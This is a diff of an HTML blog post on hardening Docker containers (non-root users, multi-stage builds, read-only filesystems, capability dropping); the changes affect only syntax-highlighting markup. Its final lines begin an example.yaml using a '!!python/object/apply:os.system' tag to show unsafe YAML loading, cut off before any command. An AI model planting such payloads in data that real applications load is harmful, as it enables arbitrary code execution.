@@ -138,12 +138,12 @@ file to make sure that some files are not added.&lt;/p&gt;
 ID 0 &amp;mdash; with root. It is recommended not to do that. You can change that in
 multiple ways:&lt;/p&gt;
 &lt;p&gt;Within the Dockerfile &amp;mdash; I prefer that one:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;RUN&lt;/span&gt; groupadd -r noroot &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; useradd -r -g noroot noroot
-&lt;span class="k"&gt;USER&lt;/span&gt;&lt;span class="s"&gt; noroot&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;RUN&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;groupadd&lt;span class="w"&gt; &lt;/span&gt;-r&lt;span class="w"&gt; &lt;/span&gt;noroot&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;useradd&lt;span class="w"&gt; &lt;/span&gt;-r&lt;span class="w"&gt; &lt;/span&gt;-g&lt;span class="w"&gt; &lt;/span&gt;noroot&lt;span class="w"&gt; &lt;/span&gt;noroot
+&lt;span class="k"&gt;USER&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;noroot&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;When you start the container:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ docker run -u &lt;span class="m"&gt;1000&lt;/span&gt; -it python:3.9.1-buster bash
-I have no name!@a70ba4f24042:/$ &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$UID&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;docker&lt;span class="w"&gt; &lt;/span&gt;run&lt;span class="w"&gt; &lt;/span&gt;-u&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;1000&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;-it&lt;span class="w"&gt; &lt;/span&gt;python:3.9.1-buster&lt;span class="w"&gt; &lt;/span&gt;bash
+I&lt;span class="w"&gt; &lt;/span&gt;have&lt;span class="w"&gt; &lt;/span&gt;no&lt;span class="w"&gt; &lt;/span&gt;name!@a70ba4f24042:/$&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;$UID&lt;/span&gt;
 &lt;span class="m"&gt;1000&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;In Kubernetes via RunAsUser in the securityContext
@@ -151,65 +151,65 @@ I have no name!@a70ba4f24042:/$ &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;spa
 &lt;h3 id="multi-stage-builds"&gt;Multi-Stage Builds&lt;/h3&gt;
 &lt;p&gt;If an attacker gets access to your container, you want them to have as few tools there as possible. Use &lt;a href="https://docs.docker.com/develop/develop-images/multistage-build/"&gt;multi-stage builds&lt;/a&gt; for that. Build your code in a build-container and use the built artifact in another container. As a bonus, your image size will be smaller.&lt;/p&gt;
 &lt;p&gt;The &lt;a href="https://docs.docker.com/develop/develop-images/multistage-build/"&gt;Docker docs&lt;/a&gt; give a very good example:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="s"&gt;golang:1.7.3&lt;/span&gt;
-&lt;span class="k"&gt;WORKDIR&lt;/span&gt;&lt;span class="s"&gt; /go/src/github.com/alexellis/href-counter/&lt;/span&gt;
-&lt;span class="k"&gt;RUN&lt;/span&gt; go get -d -v golang.org/x/net/html
-&lt;span class="k"&gt;COPY&lt;/span&gt; app.go .
-&lt;span class="k"&gt;RUN&lt;/span&gt; &lt;span class="nv"&gt;CGO_ENABLED&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="nv"&gt;GOOS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;linux go build -a -installsuffix cgo -o app .
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;golang:1.7.3&lt;/span&gt;
+&lt;span class="k"&gt;WORKDIR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;/go/src/github.com/alexellis/href-counter/&lt;/span&gt;
+&lt;span class="k"&gt;RUN&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;go&lt;span class="w"&gt; &lt;/span&gt;get&lt;span class="w"&gt; &lt;/span&gt;-d&lt;span class="w"&gt; &lt;/span&gt;-v&lt;span class="w"&gt; &lt;/span&gt;golang.org/x/net/html
+&lt;span class="k"&gt;COPY&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;app.go&lt;span class="w"&gt; &lt;/span&gt;.
+&lt;span class="k"&gt;RUN&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;CGO_ENABLED&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;GOOS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;linux&lt;span class="w"&gt; &lt;/span&gt;go&lt;span class="w"&gt; &lt;/span&gt;build&lt;span class="w"&gt; &lt;/span&gt;-a&lt;span class="w"&gt; &lt;/span&gt;-installsuffix&lt;span class="w"&gt; &lt;/span&gt;cgo&lt;span class="w"&gt; &lt;/span&gt;-o&lt;span class="w"&gt; &lt;/span&gt;app&lt;span class="w"&gt; &lt;/span&gt;.
 
-&lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="s"&gt;alpine:latest&lt;/span&gt;
-&lt;span class="k"&gt;RUN&lt;/span&gt; apk --no-cache add ca-certificates
-&lt;span class="k"&gt;WORKDIR&lt;/span&gt;&lt;span class="s"&gt; /root/&lt;/span&gt;
-&lt;span class="k"&gt;COPY&lt;/span&gt; **--from&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;** /go/src/github.com/alexellis/href-counter/app .
-&lt;span class="k"&gt;CMD&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;"./app"&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;alpine:latest&lt;/span&gt;
+&lt;span class="k"&gt;RUN&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;apk&lt;span class="w"&gt; &lt;/span&gt;--no-cache&lt;span class="w"&gt; &lt;/span&gt;add&lt;span class="w"&gt; &lt;/span&gt;ca-certificates
+&lt;span class="k"&gt;WORKDIR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;/root/&lt;/span&gt;
+&lt;span class="k"&gt;COPY&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;**--from&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;**&lt;span class="w"&gt; &lt;/span&gt;/go/src/github.com/alexellis/href-counter/app&lt;span class="w"&gt; &lt;/span&gt;.
+&lt;span class="k"&gt;CMD&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;"./app"&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;h2 id="harden-your-containers_1"&gt;Harden Your Containers&lt;/h2&gt;
 &lt;h3 id="read-only-root-file-system"&gt;Read-Only Root File System&lt;/h3&gt;
 &lt;p&gt;This depends on how you run the docker image, but if you use docker run you can add the &lt;a href="https://docs.docker.com/engine/reference/commandline/run/"&gt;--read-only flag&lt;/a&gt;. This makes the root file system read-only. This means if an attacker gets into the system, they cannot store anything on disk or change any of the executables. They can still change the memory.&lt;/p&gt;
 &lt;p&gt;You should also be aware that some pretty standard tasks like creating a temporary file obviously don&amp;rsquo;t work anymore:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ sudo docker run -it --read-only python:3.9.1-buster
-Python &lt;span class="m"&gt;3&lt;/span&gt;.9.1 &lt;span class="o"&gt;(&lt;/span&gt;default, Jan &lt;span class="m"&gt;12&lt;/span&gt; &lt;span class="m"&gt;2021&lt;/span&gt;, &lt;span class="m"&gt;16&lt;/span&gt;:45:25&lt;span class="o"&gt;)&lt;/span&gt;
-&lt;span class="o"&gt;[&lt;/span&gt;GCC &lt;span class="m"&gt;8&lt;/span&gt;.3.0&lt;span class="o"&gt;]&lt;/span&gt; on linux
-Type &lt;span class="s2"&gt;"help"&lt;/span&gt;, &lt;span class="s2"&gt;"copyright"&lt;/span&gt;, &lt;span class="s2"&gt;"credits"&lt;/span&gt; or &lt;span class="s2"&gt;"license"&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; more information.
-&amp;gt;&amp;gt;&amp;gt; import tempfile
-&amp;gt;&amp;gt;&amp;gt; &lt;span class="nv"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; tempfile.mkdtemp&lt;span class="o"&gt;()&lt;/span&gt;
-Traceback &lt;span class="o"&gt;(&lt;/span&gt;most recent call last&lt;span class="o"&gt;)&lt;/span&gt;:
-  File &lt;span class="s2"&gt;"&amp;lt;stdin&amp;gt;"&lt;/span&gt;, line &lt;span class="m"&gt;1&lt;/span&gt;, in &amp;lt;module&amp;gt;
-  File &lt;span class="s2"&gt;"/usr/local/lib/python3.9/tempfile.py"&lt;/span&gt;, line &lt;span class="m"&gt;348&lt;/span&gt;, in mkdtemp
-    prefix, suffix, dir, &lt;span class="nv"&gt;output_type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; _sanitize_params&lt;span class="o"&gt;(&lt;/span&gt;prefix, suffix, dir&lt;span class="o"&gt;)&lt;/span&gt;
-  File &lt;span class="s2"&gt;"/usr/local/lib/python3.9/tempfile.py"&lt;/span&gt;, line &lt;span class="m"&gt;118&lt;/span&gt;, in _sanitize_params
-    &lt;span class="nv"&gt;dir&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; gettempdir&lt;span class="o"&gt;()&lt;/span&gt;
-  File &lt;span class="s2"&gt;"/usr/local/lib/python3.9/tempfile.py"&lt;/span&gt;, line &lt;span class="m"&gt;287&lt;/span&gt;, in gettempdir
-    &lt;span class="nv"&gt;tempdir&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; _get_default_tempdir&lt;span class="o"&gt;()&lt;/span&gt;
-  File &lt;span class="s2"&gt;"/usr/local/lib/python3.9/tempfile.py"&lt;/span&gt;, line &lt;span class="m"&gt;219&lt;/span&gt;, in _get_default_tempdir
-    raise FileNotFoundError&lt;span class="o"&gt;(&lt;/span&gt;_errno.ENOENT,
-FileNotFoundError: &lt;span class="o"&gt;[&lt;/span&gt;Errno &lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; No usable temporary directory found in &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'/tmp'&lt;/span&gt;, &lt;span class="s1"&gt;'/var/tmp'&lt;/span&gt;, &lt;span class="s1"&gt;'/usr/tmp'&lt;/span&gt;, &lt;span class="s1"&gt;'/'&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;sudo&lt;span class="w"&gt; &lt;/span&gt;docker&lt;span class="w"&gt; &lt;/span&gt;run&lt;span class="w"&gt; &lt;/span&gt;-it&lt;span class="w"&gt; &lt;/span&gt;--read-only&lt;span class="w"&gt; &lt;/span&gt;python:3.9.1-buster
+Python&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;.9.1&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;default,&lt;span class="w"&gt; &lt;/span&gt;Jan&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;12&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2021&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;16&lt;/span&gt;:45:25&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;GCC&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;8&lt;/span&gt;.3.0&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;on&lt;span class="w"&gt; &lt;/span&gt;linux
+Type&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"help"&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"copyright"&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"credits"&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;or&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"license"&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;more&lt;span class="w"&gt; &lt;/span&gt;information.
+&amp;gt;&amp;gt;&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;import&lt;span class="w"&gt; &lt;/span&gt;tempfile
+&amp;gt;&amp;gt;&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;tempfile.mkdtemp&lt;span class="o"&gt;()&lt;/span&gt;
+Traceback&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;most&lt;span class="w"&gt; &lt;/span&gt;recent&lt;span class="w"&gt; &lt;/span&gt;call&lt;span class="w"&gt; &lt;/span&gt;last&lt;span class="o"&gt;)&lt;/span&gt;:
+&lt;span class="w"&gt;  &lt;/span&gt;File&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"&amp;lt;stdin&amp;gt;"&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;line&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&amp;lt;module&amp;gt;
+&lt;span class="w"&gt;  &lt;/span&gt;File&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"/usr/local/lib/python3.9/tempfile.py"&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;line&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;348&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;mkdtemp
+&lt;span class="w"&gt;    &lt;/span&gt;prefix,&lt;span class="w"&gt; &lt;/span&gt;suffix,&lt;span class="w"&gt; &lt;/span&gt;dir,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;output_type&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_sanitize_params&lt;span class="o"&gt;(&lt;/span&gt;prefix,&lt;span class="w"&gt; &lt;/span&gt;suffix,&lt;span class="w"&gt; &lt;/span&gt;dir&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;File&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"/usr/local/lib/python3.9/tempfile.py"&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;line&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;118&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_sanitize_params
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nv"&gt;dir&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;gettempdir&lt;span class="o"&gt;()&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;File&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"/usr/local/lib/python3.9/tempfile.py"&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;line&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;287&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;gettempdir
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nv"&gt;tempdir&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_get_default_tempdir&lt;span class="o"&gt;()&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;File&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"/usr/local/lib/python3.9/tempfile.py"&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;line&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;219&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_get_default_tempdir
+&lt;span class="w"&gt;    &lt;/span&gt;raise&lt;span class="w"&gt; &lt;/span&gt;FileNotFoundError&lt;span class="o"&gt;(&lt;/span&gt;_errno.ENOENT,
+FileNotFoundError:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;Errno&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;No&lt;span class="w"&gt; &lt;/span&gt;usable&lt;span class="w"&gt; &lt;/span&gt;temporary&lt;span class="w"&gt; &lt;/span&gt;directory&lt;span class="w"&gt; &lt;/span&gt;found&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'/tmp'&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;'/var/tmp'&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;'/usr/tmp'&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;'/'&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;You can work around this issue by mounting /tmp as a volume:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ sudo docker run -it --mount &lt;span class="nv"&gt;source&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;myvol2,target&lt;span class="o"&gt;=&lt;/span&gt;/tmp --read-only python:3.9.1-buster
-Python &lt;span class="m"&gt;3&lt;/span&gt;.9.1 &lt;span class="o"&gt;(&lt;/span&gt;default, Jan &lt;span class="m"&gt;12&lt;/span&gt; &lt;span class="m"&gt;2021&lt;/span&gt;, &lt;span class="m"&gt;16&lt;/span&gt;:45:25&lt;span class="o"&gt;)&lt;/span&gt;
-&lt;span class="o"&gt;[&lt;/span&gt;GCC &lt;span class="m"&gt;8&lt;/span&gt;.3.0&lt;span class="o"&gt;]&lt;/span&gt; on linux
-Type &lt;span class="s2"&gt;"help"&lt;/span&gt;, &lt;span class="s2"&gt;"copyright"&lt;/span&gt;, &lt;span class="s2"&gt;"credits"&lt;/span&gt; or &lt;span class="s2"&gt;"license"&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; more information.
-&amp;gt;&amp;gt;&amp;gt; import tempfile&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; tempfile.mkdtemp&lt;span class="o"&gt;()&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;sudo&lt;span class="w"&gt; &lt;/span&gt;docker&lt;span class="w"&gt; &lt;/span&gt;run&lt;span class="w"&gt; &lt;/span&gt;-it&lt;span class="w"&gt; &lt;/span&gt;--mount&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;source&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;myvol2,target&lt;span class="o"&gt;=&lt;/span&gt;/tmp&lt;span class="w"&gt; &lt;/span&gt;--read-only&lt;span class="w"&gt; &lt;/span&gt;python:3.9.1-buster
+Python&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;.9.1&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;default,&lt;span class="w"&gt; &lt;/span&gt;Jan&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;12&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2021&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;16&lt;/span&gt;:45:25&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;GCC&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;8&lt;/span&gt;.3.0&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;on&lt;span class="w"&gt; &lt;/span&gt;linux
+Type&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"help"&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"copyright"&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"credits"&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;or&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"license"&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;more&lt;span class="w"&gt; &lt;/span&gt;information.
+&amp;gt;&amp;gt;&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;import&lt;span class="w"&gt; &lt;/span&gt;tempfile&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;tempfile.mkdtemp&lt;span class="o"&gt;()&lt;/span&gt;
 
 
-$ sudo docker run --rm -i -v&lt;span class="o"&gt;=&lt;/span&gt;myvol2:/tmp/v busybox find /tmp/v
+$&lt;span class="w"&gt; &lt;/span&gt;sudo&lt;span class="w"&gt; &lt;/span&gt;docker&lt;span class="w"&gt; &lt;/span&gt;run&lt;span class="w"&gt; &lt;/span&gt;--rm&lt;span class="w"&gt; &lt;/span&gt;-i&lt;span class="w"&gt; &lt;/span&gt;-v&lt;span class="o"&gt;=&lt;/span&gt;myvol2:/tmp/v&lt;span class="w"&gt; &lt;/span&gt;busybox&lt;span class="w"&gt; &lt;/span&gt;find&lt;span class="w"&gt; &lt;/span&gt;/tmp/v
 /tmp/v
 /tmp/v/tmpbhw8djco
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;Even better is using the host's temporary file system:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ sudo docker run -it **--tmpfs /tmp** --read-only python:3.9.1-buster
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;sudo&lt;span class="w"&gt; &lt;/span&gt;docker&lt;span class="w"&gt; &lt;/span&gt;run&lt;span class="w"&gt; &lt;/span&gt;-it&lt;span class="w"&gt; &lt;/span&gt;**--tmpfs&lt;span class="w"&gt; &lt;/span&gt;/tmp**&lt;span class="w"&gt; &lt;/span&gt;--read-only&lt;span class="w"&gt; &lt;/span&gt;python:3.9.1-buster
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;h3 id="limit-capabilities"&gt;Limit Capabilities&lt;/h3&gt;
 &lt;p&gt;You can limit the &lt;a href="https://man7.org/linux/man-pages/man7/capabilities.7.html"&gt;Linux kernel capabilities&lt;/a&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ docker run **--cap-drop all** -it python:3.9.1-buster bash
-root@3c568219116e:/# groupadd -r noroot
-**groupadd: failure &lt;span class="k"&gt;while&lt;/span&gt; writing changes to /etc/gshadow**
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;docker&lt;span class="w"&gt; &lt;/span&gt;run&lt;span class="w"&gt; &lt;/span&gt;**--cap-drop&lt;span class="w"&gt; &lt;/span&gt;all**&lt;span class="w"&gt; &lt;/span&gt;-it&lt;span class="w"&gt; &lt;/span&gt;python:3.9.1-buster&lt;span class="w"&gt; &lt;/span&gt;bash
+root@3c568219116e:/#&lt;span class="w"&gt; &lt;/span&gt;groupadd&lt;span class="w"&gt; &lt;/span&gt;-r&lt;span class="w"&gt; &lt;/span&gt;noroot
+**groupadd:&lt;span class="w"&gt; &lt;/span&gt;failure&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;writing&lt;span class="w"&gt; &lt;/span&gt;changes&lt;span class="w"&gt; &lt;/span&gt;to&lt;span class="w"&gt; &lt;/span&gt;/etc/gshadow**
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;You can then grant the ones your application needs:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ docker run --cap-drop all --cap-add CHOWN -it python:3.9.1-buster bash
-root@3c568219116e:/# groupadd -r noroot
-groupadd: failure &lt;span class="k"&gt;while&lt;/span&gt; writing changes to /etc/gshadow
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;docker&lt;span class="w"&gt; &lt;/span&gt;run&lt;span class="w"&gt; &lt;/span&gt;--cap-drop&lt;span class="w"&gt; &lt;/span&gt;all&lt;span class="w"&gt; &lt;/span&gt;--cap-add&lt;span class="w"&gt; &lt;/span&gt;CHOWN&lt;span class="w"&gt; &lt;/span&gt;-it&lt;span class="w"&gt; &lt;/span&gt;python:3.9.1-buster&lt;span class="w"&gt; &lt;/span&gt;bash
+root@3c568219116e:/#&lt;span class="w"&gt; &lt;/span&gt;groupadd&lt;span class="w"&gt; &lt;/span&gt;-r&lt;span class="w"&gt; &lt;/span&gt;noroot
+groupadd:&lt;span class="w"&gt; &lt;/span&gt;failure&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;writing&lt;span class="w"&gt; &lt;/span&gt;changes&lt;span class="w"&gt; &lt;/span&gt;to&lt;span class="w"&gt; &lt;/span&gt;/etc/gshadow
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;In Kubernetes, this is done via capabilities in the securityContext
 (&lt;a href="https://kubernetes.io/docs/tasks/configure-pod-container/security-context/"&gt;docs&lt;/a&gt;).&lt;/p&gt;
@@ -357,7 +357,7 @@ potential side effect, they could allow &lt;strong&gt;arbitrary code execution&l
 &lt;p&gt;Take this example.yaml file:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kt"&gt;!!python/object/apply:os.system&lt;/span&gt;
 
